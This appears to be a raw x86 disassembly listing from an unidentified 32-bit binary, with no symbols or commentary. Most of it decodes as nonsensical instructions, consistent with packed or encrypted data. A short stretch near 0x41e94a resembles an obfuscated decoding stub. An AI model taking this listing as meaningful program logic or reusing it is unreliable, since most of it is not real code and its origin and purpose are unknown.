  41e2e1:	pop    ds
  41e2e2:	inc    eax
  41e2e3:	and    ebx,eax
  41e2e5:	scas   eax,DWORD PTR es:[edi]
  41e2e6:	adc    cl,dl
  41e2e8:	je     0x41e2ea
  41e2ea:	push   eax
  41e2eb:	push   eax
  41e2ec:	jno    0x41e2a6
  41e2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ef:	gs jmp 0x41e319
  41e2f2:	push   ds
  41e2f3:	in     eax,0xb8
  41e2f5:	push   0xe826dba0
  41e2fa:	push   0xffffffee
  41e2fc:	data16 fistp WORD PTR [esi-0x3b10763a]
  41e303:	in     eax,dx
  41e304:	adc    edx,DWORD PTR [esi-0x71160f53]
  41e30a:	push   cs
  41e30b:	sub    DWORD PTR [edx+0x7dfc7256],esp
  41e311:	out    dx,al
  41e312:	pop    eax
  41e313:	push   esp
  41e314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e315:	outs   dx,BYTE PTR ds:[esi]
  41e316:	dec    ebx
  41e317:	dec    esi
  41e318:	bound  ebp,QWORD PTR [esi]
  41e31a:	int    0xf4
  41e31c:	jae    0x41e2a4
  41e31e:	xor    esp,ebp
  41e320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e321:	dec    ecx
  41e322:	not    DWORD PTR [edx+ebp*8-0x7117bf46]
  41e329:	and    al,0xc9
  41e32b:	push   es
  41e32c:	cmp    bh,BYTE PTR [edx+0x16]
  41e32f:	cld    
  41e330:	fs int3 
  41e332:	hlt    
  41e333:	jno    0x41e380
  41e335:	add    cl,BYTE PTR ds:0x47f2f824
  41e33b:	sahf   
  41e33c:	test   BYTE PTR [ebx],dh
  41e33e:	and    DWORD PTR [edx+0x304f821d],edi
  41e344:	stc    
  41e345:	inc    eax
  41e346:	stc    
  41e347:	aad    0x1a
  41e349:	inc    edi
  41e34a:	jg     0x41e3a3
  41e34c:	and    eax,0x8fbb6bbf
  41e351:	add    al,0xab
  41e353:	sbb    al,0x94
  41e355:	jge    0x41e3c4
  41e357:	call   0x848:0x631860c1
  41e35e:	in     al,0xe7
  41e360:	push   ebp
  41e361:	xor    al,0xdc
  41e363:	xor    BYTE PTR ds:0x52415148,dl
  41e369:	mov    al,0xc6
  41e36b:	lds    edi,FWORD PTR [ecx]
  41e36d:	inc    esp
  41e36e:	adc    esp,DWORD PTR [edx]
  41e370:	mov    cl,0x90
  41e372:	dec    edx
  41e373:	and    DWORD PTR [ebx+0x4d],esi
  41e376:	add    cl,BYTE PTR [esi+eax*1]
  41e379:	stc    
  41e37a:	imul   edx,DWORD PTR ds:0x4a072f46,0x76fd81fd
  41e384:	cwde   
  41e385:	rcl    DWORD PTR [edi-0x46],cl
  41e388:	je     0x41e329
  41e38a:	loopne 0x41e390
  41e38c:	mov    dh,0x7b
  41e38e:	test   eax,0x9a1161f8
  41e393:	fs das 
  41e395:	das    
  41e396:	rcr    bl,cl
  41e398:	push   es
  41e399:	push   edi
  41e39a:	push   ds
  41e39b:	out    0x2e,ax
  41e39e:	xchg   cl,bh
  41e3a0:	rep stos BYTE PTR es:[edi],al
  41e3a2:	pop    eax
  41e3a3:	std    
  41e3a4:	js     0x41e40a
  41e3a6:	pop    ss
  41e3a7:	add    DWORD PTR [esi],edi
  41e3a9:	rcl    BYTE PTR [edi],0x47
  41e3ac:	inc    esp
  41e3ad:	call   0xc8b2078d
  41e3b2:	lods   al,BYTE PTR ds:[esi]
  41e3b3:	xor    al,0x61
  41e3b5:	cmp    bl,cl
  41e3b7:	lea    edx,[ebp-0x6f]
  41e3ba:	mov    WORD PTR [eax],gs
  41e3bc:	gs jmp 0x41e433
  41e3bf:	add    ch,dh
  41e3c1:	add    DWORD PTR [esi],esi
  41e3c3:	in     eax,dx
  41e3c4:	(bad)  
  41e3c5:	into   
  41e3c6:	lods   eax,DWORD PTR ds:[esi]
  41e3c7:	aas    
  41e3c8:	or     al,0x99
  41e3ca:	scas   eax,DWORD PTR es:[edi]
  41e3cb:	div    ch
  41e3cd:	repz push edx
  41e3cf:	hlt    
  41e3d0:	scas   eax,DWORD PTR es:[edi]
  41e3d1:	cmp    esi,edi
  41e3d3:	mov    cl,al
  41e3d5:	pop    ds
  41e3d6:	out    0x11,eax
  41e3d8:	inc    ebp
  41e3d9:	add    edi,esi
  41e3db:	sub    DWORD PTR [edx-0x42ca79d1],esi
  41e3e1:	scas   eax,DWORD PTR es:[edi]
  41e3e2:	sub    ebx,edi
  41e3e4:	(bad)  
  41e3e5:	or     eax,0xe8971719
  41e3ea:	es nop
  41e3ec:	jmp    FWORD PTR [ebx]
  41e3ee:	das    
  41e3ef:	test   BYTE PTR [eax],0xfe
  41e3f2:	xchg   edi,eax
  41e3f3:	mov    bl,0x29
  41e3f5:	or     DWORD PTR [edx-0xfe7b1cc],esi
  41e3fb:	xor    ah,BYTE PTR [ebp+0x36]
  41e3fe:	mov    ds:0x1274ef2b,eax
  41e403:	sub    eax,0x62c14bf4
  41e408:	sbb    DWORD PTR [esi],ecx
  41e40a:	cli    
  41e40b:	ja     0x41e38f
  41e40d:	adc    ecx,0x57e24f9d
  41e413:	ds lock push edi
  41e416:	outs   dx,BYTE PTR ds:[esi]
  41e417:	jae    0x41e410
  41e419:	scas   al,BYTE PTR es:[edi]
  41e41a:	dec    ecx
  41e41b:	(bad)  
  41e41c:	sbb    al,0x6f
  41e41e:	dec    ebp
  41e41f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e420:	sub    eax,0xbab19603
  41e425:	sub    DWORD PTR [esi+ecx*2+0x3],eax
  41e429:	mov    es,esi
  41e42b:	lea    edx,[edi-0x212781a0]
  41e431:	and    DWORD PTR [ebx+0x40],0xcabaff5f
  41e438:	mov    ecx,0xbd407682
  41e43d:	inc    DWORD PTR [ebx-0x2b]
  41e440:	mov    esp,0x27163dd7
  41e445:	xchg   BYTE PTR [edi],dl
  41e447:	imul   edx,DWORD PTR [ebx],0xffffff9a
  41e44a:	or     al,0x74
  41e44c:	jp     0x41e484
  41e44e:	sub    eax,0xb3bc0e84
  41e453:	call   DWORD PTR [ebx]
  41e455:	pop    esi
  41e456:	add    BYTE PTR [ecx-0x10],dl
  41e459:	push   esi
  41e45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e45b:	js     0x41e437
  41e45d:	jl     0x41e419
  41e45f:	add    al,0xe1
  41e461:	mov    ebx,0x1903128b
  41e466:	ds and ebp,ebx
  41e469:	dec    BYTE PTR [ebp-0x71378143]
  41e46f:	aad    0xfc
  41e471:	mov    ds:0xc7c15e03,al
  41e476:	jmp    0x38e3:0xe6e8587b
  41e47d:	(bad)  
  41e47e:	fcomi  st,st(2)
  41e480:	shr    BYTE PTR [ebx+0x5b],0x25
  41e484:	icebp  
  41e485:	xchg   esp,eax
  41e486:	xchg   esi,eax
  41e487:	cmp    eax,0x1278585c
  41e48c:	aas    
  41e48d:	mov    al,ds:0x20825d91
  41e492:	ror    esi,0xd7
  41e495:	stos   BYTE PTR es:[edi],al
  41e496:	fs xchg ebx,eax
  41e498:	mov    esp,0x21f6352e
  41e49d:	ds xor eax,0xb2e12a76
  41e4a3:	(bad)  
  41e4a4:	aam    0xf6
  41e4a6:	xchg   ecx,eax
  41e4a7:	or     bl,al
  41e4a9:	inc    edi
  41e4aa:	(bad)  
  41e4ab:	xor    DWORD PTR [esi+0x7bdc97c1],esp
  41e4b1:	adc    al,BYTE PTR [ecx+0xb1ee91d]
  41e4b7:	xor    ch,al
  41e4b9:	pusha  
  41e4ba:	xchg   ebp,eax
  41e4bb:	stc    
  41e4bc:	jo     0x41e4f1
  41e4be:	retf   0xc51e
  41e4c1:	mov    dl,0x9b
  41e4c3:	cmp    ah,BYTE PTR [ecx+0xbb4594a]
  41e4c9:	gs jae 0x41e482
  41e4cc:	lods   al,BYTE PTR ds:[esi]
  41e4cd:	xchg   ecx,eax
  41e4ce:	pop    ecx
  41e4cf:	fwait
  41e4d0:	jecxz  0x41e4f7
  41e4d2:	cmp    BYTE PTR [ebp-0x6f3b4056],bh
  41e4d8:	aas    
  41e4d9:	xchg   BYTE PTR [edx],dh
  41e4db:	scas   al,BYTE PTR es:[edi]
  41e4dc:	sub    eax,0x1e998084
  41e4e1:	inc    ecx
  41e4e2:	cli    
  41e4e3:	and    ecx,DWORD PTR [esi+0x7ee7a141]
  41e4e9:	mov    eax,0x92c6d66a
  41e4ee:	aad    0xe5
  41e4f0:	adc    edx,DWORD PTR [ecx-0x80]
  41e4f3:	mov    dh,0xed
  41e4f5:	cli    
  41e4f6:	jecxz  0x41e571
  41e4f8:	rcl    ebx,0x86
  41e4fb:	pop    edi
  41e4fc:	xor    al,0x52
  41e4fe:	hlt    
  41e4ff:	out    dx,al
  41e500:	cwde   
  41e501:	xor    eax,0x4e5598d4
  41e506:	mov    esp,0x2890aac
  41e50b:	ins    BYTE PTR es:[edi],dx
  41e50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e50d:	pop    edx
  41e50e:	sbb    BYTE PTR [ebx+0x1c0d4fdf],bh
  41e514:	inc    ecx
  41e515:	out    dx,eax
  41e516:	adc    al,0x38
  41e518:	es add al,0x69
  41e51b:	addr16 and al,0x5f
  41e51e:	cs cmp al,0x3f
  41e521:	mov    ch,0x42
  41e523:	rcl    al,1
  41e525:	mov    dl,0xec
  41e527:	jmp    0x62089452
  41e52c:	mov    al,ds:0x814b4f08
  41e531:	idiv   DWORD PTR [esi+0x20]
  41e534:	lds    edi,FWORD PTR [edi+0x69a671ae]
  41e53a:	pop    edx
  41e53b:	in     al,dx
  41e53c:	ds push ds
  41e53e:	outs   dx,BYTE PTR ds:[esi]
  41e53f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e540:	paddw  mm6,QWORD PTR [ebx]
  41e543:	pop    ds
  41e544:	shl    BYTE PTR [ebp+0xd],cl
  41e547:	popa   
  41e548:	rcl    al,1
  41e54a:	jae    0x41e529
  41e54c:	mov    ebx,0x178d8944
  41e551:	mov    ah,0xd1
  41e553:	inc    esp
  41e554:	iret   
  41e555:	add    esi,DWORD PTR [esi]
  41e557:	dec    esp
  41e558:	xchg   ch,bl
  41e55a:	fucomi st,st(0)
  41e55c:	mov    al,0xca
  41e55e:	push   0xfffffff1
  41e560:	pusha  
  41e561:	cs inc eax
  41e563:	jg     0x41e4e7
  41e565:	ss dec ebp
  41e567:	push   edi
  41e568:	push   0xc3261ce9
  41e56d:	sbb    al,0x88
  41e56f:	ins    DWORD PTR es:[edi],dx
  41e570:	daa    
  41e571:	inc    ecx
  41e572:	cld    
  41e573:	lods   al,BYTE PTR ds:[esi]
  41e574:	fsubr  DWORD PTR [ebp-0xa780288]
  41e57a:	stos   DWORD PTR es:[edi],eax
  41e57b:	inc    esi
  41e57c:	cli    
  41e57d:	mov    BYTE PTR [ebx],ch
  41e57f:	pop    ss
  41e580:	or     eax,0x96aee1b0
  41e585:	mov    dh,0xaf
  41e587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e588:	cmc    
  41e589:	push   0xeea596e1
  41e58e:	mov    ds:0xbe506533,al
  41e593:	out    0x57,eax
  41e595:	cmp    ebx,eax
  41e597:	cmp    eax,0xab79fdce
  41e59c:	(bad)  
  41e59d:	pusha  
  41e59e:	add    al,0x2d
  41e5a0:	mov    al,0x3
  41e5a2:	sub    DWORD PTR [ecx-0x6d],eax
  41e5a5:	es mov dh,0xdf
  41e5a8:	add    ah,BYTE PTR [eax+ecx*4-0x18]
  41e5ac:	daa    
  41e5ad:	fstp   TBYTE PTR [ebp+eiz*4-0x37]
  41e5b1:	repz cmp dh,BYTE PTR [ebp-0x40]
  41e5b5:	aad    0x11
  41e5b7:	lock ss pop dx
  41e5bb:	mov    esi,0x324dcf3
  41e5c0:	fcom   QWORD PTR [edi]
  41e5c2:	pop    es
  41e5c3:	pop    es
  41e5c4:	pop    ecx
  41e5c5:	mov    edi,0xed1da679
  41e5ca:	pop    ss
  41e5cb:	or     esi,DWORD PTR [eax+edx*4+0x17769d94]
  41e5d2:	mov    al,0x81
  41e5d4:	mov    al,ds:0x846b6497
  41e5d9:	sub    al,0xd6
  41e5db:	cmp    eax,0xc0c7a138
  41e5e0:	push   edx
  41e5e1:	and    BYTE PTR [edi-0x2e],dl
  41e5e4:	mov    al,ds:0x8ed5c705
  41e5e9:	and    DWORD PTR [esi],ebx
  41e5eb:	pop    ss
  41e5ec:	dec    ecx
  41e5ed:	xor    al,0xd6
  41e5ef:	cmc    
  41e5f0:	or     BYTE PTR [eax+esi*8],bl
  41e5f3:	fst    QWORD PTR [edi+0x1f40de0]
  41e5f9:	adc    BYTE PTR ds:0x8c521406,cl
  41e5ff:	dec    edi
  41e600:	xor    bl,ch
  41e602:	dec    ebx
  41e603:	jmp    0xc3618b8f
  41e608:	sbb    eax,eax
  41e60a:	dec    ebp
  41e60b:	retf   0x8fb
  41e60e:	xchg   ebx,eax
  41e60f:	dec    ecx
  41e610:	push   cs
  41e611:	mov    BYTE PTR [eax+0x22],bl
  41e614:	and    esp,esp
  41e616:	loop   0x41e5c5
  41e618:	pop    ebx
  41e619:	or     eax,edi
  41e61b:	adc    eax,0x8ceb190d
  41e620:	cmp    BYTE PTR [ecx+esi*4],0xf3
  41e624:	or     ecx,DWORD PTR [esp+edi*8-0x3a]
  41e628:	cmp    edi,DWORD PTR [edi+eax*2+0x33]
  41e62c:	sbb    eax,0xdf0b539d
  41e631:	sar    DWORD PTR [ecx],cl
  41e633:	jo     0x41e649
  41e635:	(bad)  
  41e636:	fild   DWORD PTR [ecx+0x2b]
  41e639:	sbb    BYTE PTR [esi+0x17],bh
  41e63c:	jg     0x41e66a
  41e63e:	mov    edi,0x155b860
  41e643:	jl     0x41e673
  41e645:	(bad)  
  41e646:	clc    
  41e647:	je     0x41e63c
  41e649:	add    BYTE PTR [eax],cl
  41e64b:	inc    esp
  41e64c:	(bad)  [esi]
  41e64e:	sti    
  41e64f:	adc    esi,0xdbe331a5
  41e655:	retf   
  41e656:	adc    BYTE PTR [eax-0x4dc433b9],bl
  41e65c:	mov    esi,0xa817d299
  41e661:	sub    BYTE PTR ds:0xe2484275,0x98
  41e668:	xchg   BYTE PTR [ecx-0x53],ah
  41e66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e66c:	cmp    edi,DWORD PTR [esi]
  41e66e:	ss xor ebx,esp
  41e671:	dec    edx
  41e672:	mov    ?,edi
  41e674:	imul   ebp,DWORD PTR [ebp+0x30],0x372bcb56
  41e67b:	sub    eax,0x1e4f5b31
  41e680:	sahf   
  41e681:	outs   dx,BYTE PTR ds:[esi]
  41e683:	aam    0x45
  41e685:	sub    cl,0xfb
  41e688:	mov    ebp,0xc8ae55a4
  41e68d:	mov    ds:0x4b0a3106,al
  41e692:	nop    edi
  41e695:	dec    DWORD PTR [ecx]
  41e697:	ret    0x18ad
  41e69a:	xor    eax,0x1486964f
  41e69f:	mov    bl,0x45
  41e6a1:	push   ecx
  41e6a2:	and    BYTE PTR [eax+ecx*4+0x5],ah
  41e6a6:	xchg   edi,eax
  41e6a7:	pop    edx
  41e6a8:	fdivr  QWORD PTR [ebx-0x205c8f32]
  41e6ae:	(bad)  
  41e6af:	loop   0x41e71a
  41e6b1:	xchg   edi,eax
  41e6b2:	mov    ch,0x93
  41e6b4:	cs cmp al,0xb7
  41e6b8:	jns    0x41e705
  41e6ba:	repz test al,ah
  41e6bd:	xor    BYTE PTR [esi-0x69286e10],bl
  41e6c3:	iret   
  41e6c4:	in     eax,0xb1
  41e6c6:	pop    esp
  41e6c7:	repz dec esp
  41e6c9:	lock mov bh,BYTE PTR [edx]
  41e6cc:	pusha  
  41e6cd:	fadd   QWORD PTR [ebx+ebx*4+0x1f]
  41e6d1:	dec    edi
  41e6d2:	cs retf 
  41e6d4:	fincstp 
  41e6d6:	shl    esp,0x4d
  41e6d9:	mov    bl,0xc9
  41e6db:	mov    DWORD PTR [esi],esp
  41e6dd:	and    ebx,DWORD PTR [edx]
  41e6df:	mov    WORD PTR [esi-0x78],cs
  41e6e2:	aaa    
  41e6e3:	xchg   edi,eax
  41e6e4:	add    ebx,edx
  41e6e6:	inc    ebx
  41e6e7:	sti    
  41e6e8:	fld    DWORD PTR [ecx+eiz*4+0x4f0ff985]
  41e6ef:	pusha  
  41e6f0:	rol    DWORD PTR [ebp+0x7ffd644f],cl
  41e6f6:	dec    ecx
  41e6f7:	ins    BYTE PTR es:[edi],dx
  41e6f8:	cmc    
  41e6f9:	add    DWORD PTR [ecx],ebx
  41e6fb:	mov    ds:0x7addd667,eax
  41e700:	retf   
  41e701:	jbe    0x41e734
  41e703:	jecxz  0x41e703
  41e705:	jle    0x34bd2cd0
  41e70b:	mov    edi,0x4ec317e2
  41e710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e711:	mov    ecx,DWORD PTR [eax-0x77876581]
  41e717:	and    eax,0x69318561
  41e71c:	stc    
  41e71d:	addr16 mov edx,edx
  41e720:	pcmpgtb mm4,QWORD PTR [ecx+0x5a1b10d6]
  41e727:	loop   0x41e74f
  41e729:	pushf  
  41e72a:	and    al,0x8e
  41e72c:	test   eax,0xe84fd8b4
  41e731:	and    eax,DWORD PTR [eax+0x44]
  41e734:	mov    bh,0x6
  41e736:	data16 mov al,0xfe
  41e739:	mov    cl,0xaa
  41e73b:	pop    ss
  41e73c:	inc    esp
  41e73d:	sub    ecx,DWORD PTR ds:0x320147ab
  41e743:	jg     0x41e714
  41e745:	mov    bl,0x62
  41e747:	push   es
  41e748:	mov    ah,BYTE PTR ds:0x8e2eea2c
  41e74e:	jecxz  0x41e764
  41e750:	and    esi,0xffffff93
  41e753:	xor    al,0x68
  41e755:	pop    ecx
  41e756:	stc    
  41e757:	jne    0x41e7cc
  41e759:	xor    DWORD PTR [edx-0x38],esp
  41e75c:	das    
  41e75d:	ja     0x41e705
  41e75f:	jecxz  0x41e7c8
  41e761:	cdq    
  41e762:	jno    0x41e7b3
  41e764:	call   0xe5e78cd
  41e769:	ret    
  41e76a:	dec    ebx
  41e76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e76c:	add    eax,0x5faed445
  41e771:	pop    esp
  41e772:	inc    ecx
  41e773:	or     eax,0x2064b972
  41e778:	dec    ebx
  41e779:	adc    DWORD PTR ds:0x44c50bbf,edx
  41e77f:	mov    ch,0x56
  41e781:	push   cs
  41e782:	mov    edx,0x810d6555
  41e787:	mov    dl,0x13
  41e789:	pusha  
  41e78a:	mov    bh,0xc0
  41e78c:	enter  0x2c4e,0xee
  41e790:	xor    al,0x76
  41e792:	sbb    DWORD PTR [edi+0x7ad2bba6],eax
  41e798:	jecxz  0x41e80f
  41e79a:	icebp  
  41e79b:	test   DWORD PTR [edi+0x5c],edx
  41e79e:	iret   
  41e79f:	jmp    0x80140feb
  41e7a4:	xor    eax,0x98539b9f
  41e7a9:	xchg   esp,eax
  41e7aa:	mov    ah,0x19
  41e7ac:	jbe    0x41e7b4
  41e7ae:	outs   dx,BYTE PTR ds:[esi]
  41e7af:	and    al,0x8
  41e7b1:	fwait
  41e7b2:	outs   dx,DWORD PTR ds:[esi]
  41e7b3:	jle    0x41e80a
  41e7b5:	mov    edx,0xc78a5230
  41e7ba:	loop   0x41e7c3
  41e7bc:	cmc    
  41e7bd:	mov    al,0xea
  41e7bf:	sub    eax,0x55caa86f
  41e7c4:	fisttp WORD PTR [ebx+ebx*2]
  41e7c7:	adc    al,0x45
  41e7ca:	mov    DWORD PTR [eax],eax
  41e7cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7cd:	xor    al,0xec
  41e7cf:	std    
  41e7d0:	add    al,0x3a
  41e7d2:	jmp    0x41e847
  41e7d4:	mov    WORD PTR [ecx],gs
  41e7d6:	cmp    DWORD PTR [esi-0x7a],ecx
  41e7d9:	js     0x41e7f2
  41e7db:	xchg   ecx,eax
  41e7dc:	test   eax,0x8918b31c
  41e7e1:	sub    al,0xc8
  41e7e3:	push   ecx
  41e7e4:	add    ebp,DWORD PTR [edi-0x7b]
  41e7e7:	in     eax,dx
  41e7e8:	rcr    DWORD PTR [esi+0x53],cl
  41e7eb:	sbb    ch,BYTE PTR [esi+0x76]
  41e7ee:	call   0x716bfbfe
  41e7f3:	dec    ebx
  41e7f4:	imul   esi,DWORD PTR [ebp-0x2e0f2c14],0x105d01a3
  41e7fe:	es mov edi,0xba91dd87
  41e804:	pushf  
  41e805:	(bad)  
  41e806:	and    bh,BYTE PTR [ebx-0x3182ccbc]
  41e80c:	ret    
  41e80d:	cld    
  41e80e:	in     eax,dx
  41e80f:	sbb    DWORD PTR [esi-0x39],0x61
  41e813:	int3   
  41e814:	dec    ebp
  41e815:	and    eax,0x2643d0b2
  41e81a:	sbb    BYTE PTR [esi+0x32],0x8b
  41e81e:	cmp    bl,bl
  41e820:	mov    ebx,0xf9ff0818
  41e825:	push   0xbabcaf65
  41e82a:	loope  0x41e81c
  41e82c:	pusha  
  41e82d:	inc    eax
  41e82e:	jbe    0x41e7e6
  41e830:	sahf   
  41e831:	and    al,0x86
  41e833:	jmp    0x3ee14fc9
  41e838:	ins    DWORD PTR es:[edi],dx
  41e839:	popa   
  41e83a:	mov    ds:0x6f252792,al
  41e83f:	test   ebx,edi
  41e841:	pushf  
  41e842:	pop    eax
  41e843:	lea    eax,ds:0xba8669f1
  41e849:	popf   
  41e84a:	repnz or eax,0xe95ac7b4
  41e850:	xor    BYTE PTR [ecx-0x2d33c062],al
  41e856:	int3   
  41e857:	imul   eax,DWORD PTR [ebp+ecx*1+0xa177145],0xffffff9d
  41e85f:	or     eax,0x4f861019
  41e864:	mov    edi,0xb138d535
  41e869:	dec    ecx
  41e86a:	pop    esi
  41e86b:	(bad)  
  41e86d:	imul   edx,DWORD PTR [edi+edi*2-0x7a5c2fda],0xffffffce
  41e875:	out    0xa2,eax
  41e877:	pop    ebx
  41e878:	mov    eax,ds:0x8abb5046
  41e87d:	sub    ch,al
  41e87f:	mov    ah,BYTE PTR [esi]
  41e881:	and    esi,DWORD PTR [eax-0x72d44d11]
  41e887:	jns    0x41e83b
  41e889:	xor    al,0xf8
  41e88b:	nop
  41e88c:	and    BYTE PTR [edx-0x39],0x54
  41e890:	js     0x41e839
  41e892:	mov    al,0xe
  41e894:	test   ecx,0x9abdb9fa
  41e89a:	push   ecx
  41e89b:	fsubr  DWORD PTR [edi+0x7a10c2b4]
  41e8a1:	test   al,0x5d
  41e8a3:	mov    WORD PTR ds:0xc156b301,fs
  41e8a9:	cmp    BYTE PTR [edi-0xfc2c640],bl
  41e8af:	ds icebp 
  41e8b1:	push   0x10
  41e8b3:	cmp    DWORD PTR [edi+0x65b2ae16],0xeb4b9ab
  41e8bd:	jbe    0x41e87d
  41e8bf:	outs   dx,DWORD PTR ds:[esi]
  41e8c0:	xchg   esp,eax
  41e8c1:	test   DWORD PTR ds:0x38662c7c,eax
  41e8c7:	inc    eax
  41e8c8:	fdivr  st,st(4)
  41e8ca:	adc    al,BYTE PTR [eax+0x4a69ad0e]
  41e8d0:	or     eax,0xb5e83fc
  41e8d5:	or     DWORD PTR [eax+0x23],esp
  41e8d8:	ds mov bh,0xce
  41e8db:	mov    bh,0xd6
  41e8dd:	(bad)  
  41e8de:	lahf   
  41e8df:	jl     0x41e911
  41e8e1:	cmp    dl,BYTE PTR [ebx]
  41e8e3:	js     0x41e87e
  41e8e5:	pop    edi
  41e8e6:	adc    ch,dh
  41e8e8:	cmp    DWORD PTR [ebx-0x6901d4f0],ecx
  41e8ee:	shl    dl,0x30
  41e8f1:	loopne 0x41e8b2
  41e8f3:	daa    
  41e8f4:	cli    
  41e8f5:	inc    edi
  41e8f6:	xchg   esi,eax
  41e8f7:	das    
  41e8f8:	or     al,0x9d
  41e8fa:	push   es
  41e8fb:	pop    edi
  41e8fc:	inc    esi
  41e8fd:	xchg   ebx,eax
  41e8fe:	loopne 0x41e941
  41e900:	popf   
  41e901:	shl    DWORD PTR [ecx],0xa6
  41e904:	sbb    BYTE PTR [edi-0x7c6053c3],cl
  41e90a:	fs dec esi
  41e90c:	fldcw  WORD PTR [ebp-0x2c7b6d]
  41e912:	stc    
  41e913:	pop    ebx
  41e914:	xor    esi,0xae070643
  41e91a:	cmp    al,0xf1
  41e91c:	add    eax,0xae5603e6
  41e921:	dec    ecx
  41e922:	(bad)  
  41e923:	test   DWORD PTR [ebx-0x29],0x5fb64c01
  41e92a:	jp     0x41e941
  41e92c:	xchg   esi,eax
  41e92d:	and    eax,esp
  41e92f:	push   eax
  41e930:	adc    edi,edx
  41e932:	enter  0x4124,0x8a
  41e936:	jmp    0x41e8b8
  41e938:	mov    ah,0xbc
  41e93a:	jp     0x41e96a
  41e93c:	call   0x127d:0xe57403ae
  41e943:	aam    0x6a
  41e945:	inc    esi
  41e946:	dec    eax
  41e947:	les    ecx,FWORD PTR [eax]
  41e949:	pop    esi
  41e94a:	inc    ebx
  41e94b:	inc    ecx
  41e94c:	xor    edx,eax
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fld DWORD PTR es:[edx-0x7162433d]
  41e99f:	ret    0x7a7d
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41e984
  41e9a7:	mov    eax,ds:0xecec6b40
  41e9ac:	cmp    ecx,eax
  41e9ae:	mov    bl,0x83
  41e9b0:	mov    edx,eax
  41e9b2:	mov    esp,0xbee340d4
  41e9b7:	pop    edi
  41e9b8:	out    0x50,eax
  41e9ba:	mov    ebx,DWORD PTR [edx+0x4e]
  41e9bd:	adc    eax,0x52a303fa
  41e9c2:	not    BYTE PTR [ebp-0x5aa48aa7]
  41e9c8:	ss mov al,0x92
  41e9cb:	mov    cl,0xe
  41e9cd:	test   eax,0xd7357649
  41e9d2:	cmova  ecx,DWORD PTR [ebx+0x41]
  41e9d6:	into   
  41e9d7:	push   ecx
  41e9d8:	mov    WORD PTR [eax+0x1c],ss
  41e9db:	sbb    al,0xd7
  41e9dd:	xchg   esp,eax
  41e9de:	scas   al,BYTE PTR es:[edi]
  41e9df:	popa   
  41e9e0:	mov    al,ds:0x38f17231
  41e9e5:	inc    edi
  41e9e6:	aas    
  41e9e7:	cld    
  41e9e8:	fst    QWORD PTR [esi]
  41e9ea:	sbb    DWORD PTR [ebp+eax*8-0x2f481555],eax
  41e9f1:	pop    eax
  41e9f2:	xchg   ecx,eax
  41e9f3:	std    
  41e9f4:	pushf  
  41e9f5:	std    
  41e9f6:	retf   
  41e9f7:	jb     0x41e99e
  41e9f9:	cmp    ebp,DWORD PTR [edi+0x4bf563f9]
  41e9ff:	push   es
  41ea00:	sbb    ebp,eax
  41ea02:	in     eax,dx
  41ea03:	mov    bl,0x4f
  41ea05:	rol    ebx,0x8e
  41ea08:	dec    ebp
  41ea09:	shl    DWORD PTR [edi-0x16],0x6f
  41ea0d:	jmp    0x41e9d2
  41ea0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea10:	add    al,0x73
  41ea12:	xchg   esi,eax
  41ea13:	sbb    esi,DWORD PTR [eax+ebp*1+0x73]
  41ea17:	repnz xor bl,0xfc
  41ea1b:	push   ss
  41ea1c:	rol    BYTE PTR [edx],0x29
  41ea1f:	cli    
  41ea20:	xor    ebx,esp
  41ea22:	in     al,0x31
  41ea24:	push   es
  41ea25:	fimul  DWORD PTR [ebp-0x20]
  41ea28:	mov    ebp,0xc9a3dbc9
  41ea2d:	push   esi
  41ea2e:	dec    ebx
  41ea2f:	lea    esp,[edx-0x1f]
  41ea32:	(bad)  
  41ea33:	fcmovb st,st(2)
  41ea35:	and    DWORD PTR [esi+0x6c44bce8],esp
  41ea3b:	jb     0x41eaa8
  41ea3d:	movups xmm6,xmm5
  41ea40:	jae    0x41eaae
  41ea42:	(bad)
  41ea45:	dec    ebp
  41ea46:	(bad)  
  41ea47:	out    dx,eax
  41ea48:	adc    eax,0x661fa11
  41ea4d:	push   ss
  41ea4e:	xchg   edx,eax
  41ea4f:	(bad)  
  41ea50:	pop    esp
  41ea51:	inc    edx
  41ea52:	sbb    eax,0xc16ca022
  41ea57:	daa    
  41ea58:	loopne 0x41eac2
  41ea5a:	or     al,0x5c
  41ea5c:	jl     0x41e9fb
  41ea5e:	sbb    DWORD PTR [eax],esi
  41ea60:	cdq    
  41ea61:	adc    eax,0xd0e03922
  41ea66:	xchg   ebp,eax
  41ea67:	sub    al,0x2d
  41ea69:	sbb    DWORD PTR [ecx-0x5fd22dee],edi
  41ea6f:	sub    al,0x5c
  41ea71:	sub    eax,0xa9a6a034
  41ea76:	jno    0x41ea99
  41ea78:	xor    eax,0xbb0eb321
  41ea7d:	inc    eax
